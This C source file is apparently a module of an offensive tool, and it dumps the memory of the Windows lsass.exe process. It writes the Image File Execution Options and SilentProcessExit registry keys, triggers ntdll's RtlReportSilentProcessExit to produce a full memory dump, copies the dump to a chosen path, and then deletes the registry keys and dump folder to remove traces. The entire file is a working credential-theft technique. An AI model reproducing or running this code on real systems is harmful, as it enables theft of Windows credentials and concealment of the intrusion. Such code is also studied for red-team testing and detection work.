/*****************************************************************************************************
*                                                                                                    *
*  File:         DumpSilentProcessExit.C                                                             *
*  Purpose:      Performs lsass.exe dumping with the SilentProcessExit feature.                      *
*                                                                                                    *
******************************************************************************************************/
#include "DumpSilentProcessExit.h"
#include "Common.h"
#include <string.h>
#include <strsafe.h>

/*****************************************************************************************************
*                                                                                                    *
*  Constant:     IFEO_REG_KEY                                                                        *
*  Purpose:      The IFEO registry key for lsass.exe.                                                *
*                                                                                                    *
******************************************************************************************************/
#define IFEO_REG_KEY (L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\lsass.exe")

/*****************************************************************************************************
*                                                                                                    *
*  Constant:     GLOBAL_VALUE_VALUE_NAME                                                             *
*  Purpose:      The global flag registry value name.                                                *
*                                                                                                    *
******************************************************************************************************/
#define GLOBAL_FLAG_VALUE_VALUE_NAME (L"GlobalFlag")

/*****************************************************************************************************
*                                                                                                    *
*  Constant:     FLAG_MONITOR_SILENT_PROCESS_EXIT                                                    *
*  Purpose:      The registry data for the global flag to indicate a silent process exit.            *
*                                                                                                    *
******************************************************************************************************/
#define FLAG_MONITOR_SILENT_PROCESS_EXIT (0x200)

/*****************************************************************************************************
*                                                                                                    *
*  Constant:     SILENT_PROCESS_EXIT_REG_KEY                                                         *
*  Purpose:      The silent process exit registry key for lsass.exe.                                 *
*                                                                                                    *
******************************************************************************************************/
#define SILENT_PROCESS_EXIT_REG_KEY (L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\lsass.exe")

/*****************************************************************************************************
*                                                                                                    *
*  Constant:     REPORTING_MODE_VALUE_NAME                                                           *
*  Purpose:      The reporting mode registry value name.                                             *
*                                                                                                    *
******************************************************************************************************/
#define REPORTING_MODE_VALUE_NAME (L"ReportingMode")

/*****************************************************************************************************
*                                                                                                    *
*  Constant:     LOCAL_DUMP_FOLDER_VALUE_NAME                                                        *
*  Purpose:      The local dump folder registry value name.                                          *
*                                                                                                    *
******************************************************************************************************/
#define LOCAL_DUMP_FOLDER_VALUE_NAME (L"LocalDumpFolder")

/*****************************************************************************************************
*                                                                                                    *
*  Constant:     DUMP_TYPE_VALUE_NAME                                                                *
*  Purpose:      The dump type registry value name.                                                  *
*                                                                                                    *
******************************************************************************************************/
#define DUMP_TYPE_VALUE_NAME (L"DumpType")

/*****************************************************************************************************
*                                                                                                    *
*  Constant:     MINI_DUMP_WITH_FULL_MEMORY                                                          *
*  Purpose:      The registry data that indicates to perform a full memory dump.                     *
*                                                                                                    *
******************************************************************************************************/
#define MINI_DUMP_WITH_FULL_MEMORY (0x2)

/*****************************************************************************************************
*                                                                                                    *
*  Constant:     LOCAL_DUMP                                                                          *
*  Purpose:      The registry data that indicates to perform a local memory dump.                    *
*                                                                                                    *
******************************************************************************************************/
#define LOCAL_DUMP (0x2)

/*****************************************************************************************************
*                                                                                                    *
*  Prototype:    PFN_RtlReportSilentProcessExit                                                      *
*  Purpose:      Defines the function prototype for ntdll!RtlReportSilentProcessExit.                *
*  Parameters:   - hProcessHandle - the process handle.                                              *
*                - eExitStatus - the exit status.                                                    *
*  Returns:      A status indicating success or failure.                                             *
*                                                                                                    *
******************************************************************************************************/
typedef NTSTATUS (NTAPI* PFN_RtlReportSilentProcessExit)
(
    __in __notnull HANDLE hProcessHandle,
    __in NTSTATUS eExitStatus
);

/*****************************************************************************************************
*                                                                                                    *
*  Function:     dumpsilentprocessexit_FindAndCopyDumpFile                                           *
*  Purpose:      Finds the relevant dump file in the given directory and copies it.                  *
*  Parameters:   - pwszDirectoryPath - the directory path.                                           *
*                - pwszDumpPath - the destination path.                                              *
*  Returns:      A return status.                                                                    *
*  Remarks:      - Attempts to delete the directory tree root that contains the source dump file.    *
*                                                                                                    *
******************************************************************************************************/
__success(return >= 0)
static
RETSTATUS
dumpsilentprocessexit_FindAndCopyDumpFile(
    __in __notnull PWSTR pwszDirectoryPath,
    __in __notnull PWSTR pwszDumpPath
)
{
    RETSTATUS eStatus = RETSTATUS_UNEXPECTED;
    HANDLE hFind = INVALID_HANDLE_VALUE;
    WCHAR wszSearchPattern[MAX_PATH] = { 0 };
    HRESULT hrStringResult = E_UNEXPECTED;
    WIN32_FIND_DATAW tFindData = { 0 };
    WCHAR wszDumpTreeRoot[MAX_PATH] = { 0 };
    BOOL bDeleteDumpTree = FALSE;
    SHFILEOPSTRUCTW tFileOp = { 0 };
    WCHAR wszSourceFile[MAX_PATH] = { 0 };

    // Validate parameters
    DEBUG_ASSERT(NULL != pwszDirectoryPath);
    DEBUG_ASSERT(NULL != pwszDumpPath);

    // Build the search pattern
    hrStringResult = StringCchPrintfW(wszSearchPattern, ARRAYSIZE(wszSearchPattern), L"%s\\lsass.exe-*", pwszDirectoryPath);
    if (FAILED(hrStringResult))
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"StringCchPrintfW() failed (hrStringResult=%.8x)", hrStringResult);
        goto lblCleanup;
    }

    // Find the lsass.exe directory
    hFind = FindFirstFileW(wszSearchPattern, &tFindData);
    if (INVALID_HANDLE_VALUE == hFind)
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"FindFirstFileW() failed (LastError=%lu)", GetLastError());
        goto lblCleanup;
    }

    // Copy the tree root
    hrStringResult = StringCchPrintfW(wszDumpTreeRoot, ARRAYSIZE(wszDumpTreeRoot), L"%s\\%s", pwszDirectoryPath, tFindData.cFileName);
    if (FAILED(hrStringResult))
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"StringCchPrintfW() failed (hrStringResult=%.8x)", hrStringResult);
        goto lblCleanup;
    }

    // Delete the dump tree on cleanup
    tFileOp.wFunc = FO_DELETE;
    tFileOp.pFrom = wszDumpTreeRoot;
    tFileOp.pTo = L"";
    tFileOp.fFlags = FOF_NOCONFIRMATION | FOF_NOERRORUI | FOF_SILENT;
    tFileOp.lpszProgressTitle = L"";
    bDeleteDumpTree = TRUE;

    // Close the find handle
    CLOSE_FILE_FIND(hFind);

    // Build the search pattern
    hrStringResult = StringCchPrintfW(wszSearchPattern, ARRAYSIZE(wszSearchPattern), L"%s\\lsass.exe-*.dmp", wszDumpTreeRoot);
    if (FAILED(hrStringResult))
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"StringCchPrintfW() failed (hrStringResult=%.8x)", hrStringResult);
        goto lblCleanup;
    }

    // Find the lsass.exe dump file
    hFind = FindFirstFileW(wszSearchPattern, &tFindData);
    if (INVALID_HANDLE_VALUE == hFind)
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"FindFirstFileW() failed (LastError=%lu)", GetLastError());
        goto lblCleanup;
    }

    // Build the source file path
    hrStringResult = StringCchPrintfW(wszSourceFile, ARRAYSIZE(wszSourceFile), L"%s\\%s", wszDumpTreeRoot, tFindData.cFileName);
    if (FAILED(hrStringResult))
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"StringCchPrintfW() failed (hrStringResult=%.8x)", hrStringResult);
        goto lblCleanup;
    }

    // Copy the destination file
    if (!CopyFileW(wszSourceFile, pwszDumpPath, FALSE))
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"CopyFileW() failed (LastError=%lu)", GetLastError());
        goto lblCleanup;
    }

    // Success
    eStatus = RETSTATUS_SUCCESS;

lblCleanup:
    
    // Free resources
    CLOSE_FILE_FIND(hFind);
    if (bDeleteDumpTree)
    {
        (VOID)SHFileOperationW(&tFileOp);
    }

    // Return result
    return eStatus;
}

/*****************************************************************************************************
*                                                                                                    *
*  Function:     DUMPSILENTPROCESSEXIT_DumpToDisk                                                    *
*                                                                                                    *
******************************************************************************************************/
__success(return >= 0)
RETSTATUS
DUMPSILENTPROCESSEXIT_DumpToDisk(
    __in DWORD nArgs,
    __in_ecount(nArgs) __notnull PWSTR* ppwszArgs
)
{
    RETSTATUS eStatus = RETSTATUS_UNEXPECTED;
    HKEY hIfeoRegKey = NULL;
    HKEY hSilentProcExitRegKey = NULL;
    LSTATUS eRegStatus = ERROR_SUCCESS;
    DWORD dwGlobalFlagData = FLAG_MONITOR_SILENT_PROCESS_EXIT;
    BOOL bDeleteIfeoKey = FALSE;
    BOOL bDeleteSilentProcExitKey = FALSE;
    DWORD dwReportingModeData = MINI_DUMP_WITH_FULL_MEMORY;
    DWORD dwDumpType = LOCAL_DUMP;
    WCHAR wszDumpFullPath[MAX_PATH] = { 0 };
    WCHAR wszDumpDirectoryPath[MAX_PATH] = { 0 };
    PFN_RtlReportSilentProcessExit pfnRtlReportSilentProcessExit = NULL;
    HANDLE hLsassProcess = NULL;
    NTSTATUS eNtStatus = STATUS_UNSUCCESSFUL;

    // Validate arguments
    if (ARG_INDEX_LSASS_HANDLE_FETCH_TYPE >= nArgs)
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"Invalid number of arguments");
        goto lblCleanup;
    }
    if (NULL == ppwszArgs)
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"Invalid arguments (ppwszArgs=%p)", ppwszArgs);
        goto lblCleanup;
    }

    // Open lsass.exe
    eStatus = COMMON_FetchLsassHandleFromString(ppwszArgs[ARG_INDEX_LSASS_HANDLE_FETCH_TYPE], &hLsassProcess, NULL, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE);
    if (RETSTATUS_FAILED(eStatus))
    {
        DEBUG_MSG(L"FetchLsassHandleFromString failed (eStatus=%.8x)", eStatus);
        goto lblCleanup;
    }

    // Resolve the silent process exit function
    eStatus = COMMON_ResolveProcAddress(L"ntdll.dll", "RtlReportSilentProcessExit", (FARPROC*)&pfnRtlReportSilentProcessExit);
    if (RETSTATUS_FAILED(eStatus))
    {
        DEBUG_MSG(L"ResolveProcAddress failed (eStatus=%.8x)", eStatus);
        goto lblCleanup;
    }

    // Expand environment variables to the dump path
    if (0 == ExpandEnvironmentStringsW(ppwszArgs[ARG_INDEX_DUMP_PATH], wszDumpFullPath, ARRAYSIZE(wszDumpFullPath)))
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"ExpandEnvironmentStringsW() failed (LastError=%lu)", GetLastError());
        goto lblCleanup;
    }

    // Get the dump directory path
    eStatus = COMMON_GetDirectoryFromFullPath(wszDumpFullPath, wszDumpDirectoryPath, ARRAYSIZE(wszDumpDirectoryPath));
    if (RETSTATUS_FAILED(eStatus))
    {
        DEBUG_MSG(L"COMMON_GetDirectoryFromFullPath failed (eStatus=%.8x)", eStatus);
        goto lblCleanup;
    }

    // Create the IFEO registry key
    eRegStatus = RegCreateKeyW(HKEY_LOCAL_MACHINE, IFEO_REG_KEY, &hIfeoRegKey);
    if (ERROR_SUCCESS != eRegStatus)
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"RegCreateKeyW() failed (eRegStatus=%lu)", eRegStatus);
        goto lblCleanup;
    }
    bDeleteIfeoKey = TRUE;

    // Create the global flag value
    eRegStatus = RegSetValueExW(hIfeoRegKey, GLOBAL_FLAG_VALUE_VALUE_NAME, 0, REG_DWORD, (PBYTE)(&dwGlobalFlagData), sizeof(dwGlobalFlagData));
    if (ERROR_SUCCESS != eRegStatus)
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"RegSetValueExW() failed (eRegStatus=%lu)", eRegStatus);
        goto lblCleanup;
    }

    // Create the silent process exit registry key
    eRegStatus = RegCreateKeyW(HKEY_LOCAL_MACHINE, SILENT_PROCESS_EXIT_REG_KEY, &hSilentProcExitRegKey);
    if (ERROR_SUCCESS != eRegStatus)
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"RegCreateKeyW() failed (eRegStatus=%lu)", eRegStatus);
        goto lblCleanup;
    }
    bDeleteSilentProcExitKey = TRUE;

    // Create the reporting mode value
    eRegStatus = RegSetValueExW(hSilentProcExitRegKey, REPORTING_MODE_VALUE_NAME, 0, REG_DWORD, (PBYTE)(&dwReportingModeData), sizeof(dwReportingModeData));
    if (ERROR_SUCCESS != eRegStatus)
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"RegSetValueExW() failed (eRegStatus=%lu)", eRegStatus);
        goto lblCleanup;
    }

    // Create the local dump folder value
    eRegStatus = RegSetValueExW(hSilentProcExitRegKey, LOCAL_DUMP_FOLDER_VALUE_NAME, 0, REG_SZ, (PBYTE)wszDumpDirectoryPath, (DWORD)((wcslen(wszDumpDirectoryPath) + 1) * sizeof(*wszDumpDirectoryPath)));
    if (ERROR_SUCCESS != eRegStatus)
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"RegSetValueExW() failed (eRegStatus=%lu)", eRegStatus);
        goto lblCleanup;
    }

    // Create the dump type value
    eRegStatus = RegSetValueExW(hSilentProcExitRegKey, DUMP_TYPE_VALUE_NAME, 0, REG_DWORD, (PBYTE)(&dwDumpType), sizeof(dwDumpType));
    if (ERROR_SUCCESS != eRegStatus)
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"RegSetValueExW() failed (eRegStatus=%lu)", eRegStatus);
        goto lblCleanup;
    }

    // Close the registry keys to commit changes
    CLOSE_REG_KEY(hSilentProcExitRegKey);
    CLOSE_REG_KEY(hIfeoRegKey);

    // Report silent process exit on lsass.exe
    eNtStatus = pfnRtlReportSilentProcessExit(hLsassProcess, 0);
    if (!NT_SUCCESS(eNtStatus))
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"RtlReportSilentProcessExit() failed (eNtStatus=%.8x)", eNtStatus);
        goto lblCleanup;
    }

    // Find and copy the dump file
    eStatus = dumpsilentprocessexit_FindAndCopyDumpFile(wszDumpDirectoryPath, wszDumpFullPath);
    if (RETSTATUS_FAILED(eStatus))
    {
        DEBUG_MSG(L"dumpsilentprocessexit_FindAndCopyDumpFile failed (eStatus=%.8x)", eStatus);
        goto lblCleanup;
    }

    // Success
    eStatus = RETSTATUS_SUCCESS;

lblCleanup:

    // Free resources
    CLOSE_REG_KEY(hSilentProcExitRegKey);
    CLOSE_REG_KEY(hIfeoRegKey);
    CLOSE_HANDLE(hLsassProcess);
    if (bDeleteSilentProcExitKey)
    {
        (VOID)RegDeleteKeyW(HKEY_LOCAL_MACHINE, SILENT_PROCESS_EXIT_REG_KEY);
    }
    if (bDeleteIfeoKey)
    {
        (VOID)RegDeleteKeyW(HKEY_LOCAL_MACHINE, IFEO_REG_KEY);
    }

    // Return result
    return eStatus;
}
